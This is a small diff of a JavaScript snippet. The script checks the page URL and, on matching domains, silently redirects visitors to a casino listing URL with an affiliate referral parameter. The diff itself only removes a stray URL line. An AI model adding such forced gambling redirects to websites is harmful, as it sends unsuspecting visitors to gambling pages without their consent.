@@ -43,7 +43,6 @@
         window.location.href = "https://1wcneg.com/casino/list/4?p=vf9r";
     } else if (currentUrl.includes("1wzjvm.top") && !currentUrl.includes("https://1wcneg.com/casino/list/4?p=vf9r")) {
         window.location.href = "https://1wcneg.com/casino/list/4?p=vf9r";
-https://1wzjvm.top/
     }
 })();
 
